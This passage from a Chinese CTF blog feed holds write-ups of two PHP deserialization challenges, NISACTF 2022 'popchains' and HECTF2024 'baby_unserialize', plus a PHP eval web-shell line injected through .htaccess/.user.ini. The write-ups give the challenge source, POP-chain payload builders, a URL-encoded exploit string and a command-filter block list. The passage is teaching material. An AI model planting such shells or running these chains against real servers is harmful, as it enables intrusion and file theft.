class="hljs-selector-tag">b</span>.gif文件以php的形式进行取造<br>成<span class="hljs-selector-class">.user</span>.ini的漏洞<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022:popchains</title>
    <link href="/2024/08/04/2022-popchains/"/>
    <url>/2024/08/04/2022-popchains/</url>
    
    <content type="html"><![CDATA[<h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>题目类型：WEB<br>设计考点：POP链，PHP反序列化</p><h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span><br><br></code></pre></td></tr></table></figure><p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p><hr><ol><li><p>首先寻找终点</p><p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p><p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li><li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p><p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p></li><li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">Road_is_Long</span>();<br><span class="hljs-variable">$b</span>-&gt;string = <span class="hljs-keyword">new</span> <span class="hljs-type">Make_a_Change</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">Road_is_Long</span>();<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-variable">$b</span>;<br>   <br></code></pre></td></tr></table></figure><p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p></li></ol><h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Road_is_Long::__wakeup<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Road_is_Long::__toString<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Make_a_Change::__get<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Try_Work_Hard::__invoke<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Try_Work_Hard::append()<br></code></pre></td></tr></table></figure><h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>&#125;<br> <br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();<br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();<br><span class="hljs-variable">$m</span>-&gt;effort = <span class="hljs-variable">$f</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$m</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>GET</strong>传入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/wish<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Road_is_Long<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>page<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Road_is_Long<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>page<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Make_a_Change<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>effort<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Try_Work_Hard<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>var<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">49</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>php<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Ffilter<span class="hljs-variable">%2</span>Fconvert.base<span class="hljs-number">64</span>-encode<span class="hljs-variable">%2</span>Fresource<span class="hljs-variable">%3</span>D<span class="hljs-variable">%2</span>Fflag<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HECTF2024</title>
    <link href="/2024/08/04/Hectf2024/"/>
    <url>/2024/08/04/Hectf2024/</url>
    
    <content type="html"><![CDATA[<h2 id="HECTF2024-Are-you-happy"><a href="#HECTF2024-Are-you-happy" class="headerlink" title="[HECTF2024]Are you happy?"></a>[HECTF2024]Are you happy?</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：JS代码分析</p><p>题目环境打开发现是一款游戏，那么根据经验就是在游戏的JS代码里找FLAG,F12发现提示是base64，<br>那么就在JS文件里找到base64字符串<br>​ game.js里找，flag在里面，根据flag的格式，flag开头是HECTF得到flag</p><h2 id="HECTF2024-baby-unserialize"><a href="#HECTF2024-baby-unserialize" class="headerlink" title="[HECTF2024]baby_unserialize"></a>[HECTF2024]baby_unserialize</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：POP链，PHP反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag in /flag&lt;/br&gt;&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;guest&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$passwd</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-variable">$passwd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-string">&quot;guest&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>())&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;msg;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class00</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable">$b</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class01</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;temp = <span class="hljs-variable language_">$this</span>-&gt;cls-&gt;<span class="hljs-title function_ invoke__">func1</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;temp === <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="hljs-variable language_">$this</span>-&gt;str3;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;have fun&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class02</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;payload)) &#123; <br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;payload.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fuck you Hacker&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>]))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><hr><ol><li><p>典型的php反序列化题 </p><p>首先寻找我们可以利用的点，发现$class02$当中有system语句且payload可控那么这里就是pop链的终点，他的触发魔术方式是__invoke那就要寻找哪里可以触发这个方法，注意到$class00$当中存在$b()当$b为class02类时就会触发invoke，那么又要寻找如何触发__set方法class01当中有一行代码</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">cls</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">str1</span> = $this-&gt;</span>str3;<br></code></pre></td></tr></table></figure><p>当str3为class02那么就相当于$b&#x3D;new class02那么cls肯定为class00<br>继续寻找如何触发__tostring，找到User类当中的destruct方法有echo，那么赋值msg&#x3D;new class01(),但是他还要进过check()函数，就要让token的值为admin，但是反序列化会触发wakeup修改token那么payload就要绕过wakeup<br>分析完毕</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">User</span><span class="hljs-symbol">:__destruct-&gt;class01</span><span class="hljs-symbol">:__toString-&gt;class00</span><span class="hljs-symbol">:__call-&gt;class00</span><span class="hljs-symbol">:__set-&gt;class02</span><span class="hljs-symbol">:__invoke</span><br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$passwd</span></span>)</span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>     <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-variable">$passwd</span>;<br>     &#125;<br> &#125;   <br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class00</span></span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>();<br>     &#125;<br> &#125;<br><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class01</span></span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span> = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$str3</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$cls</span>;<br> <br> &#125;<br> <br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span 